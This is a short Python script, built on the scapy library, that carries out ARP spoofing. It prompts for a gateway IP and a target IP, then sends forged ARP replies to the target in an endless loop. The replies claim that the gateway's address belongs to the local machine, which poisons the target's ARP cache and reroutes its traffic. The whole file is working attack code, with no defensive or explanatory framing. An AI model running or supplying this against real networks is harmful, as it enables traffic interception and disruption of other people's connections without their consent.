import uuid
from scapy.layers.l2 import getmacbyip, Ether, ARP
from scapy.sendrecv import sendp
qw = uuid.UUID(int=uuid.getnode()).hex[-12:]
mac = ":".join([qw[e:e+2] for e in range(0,11,2)])
ip = input("gateway ip:")
ipo = input("target ip:")
maco = getmacbyip(ipo)
pkt = Ether(dst = maco)/ARP(op=2,hwsrc=mac,psrc=ip,hwdst=maco,pdst=ipo)
sendp(pkt,loop=1,inter = 1)
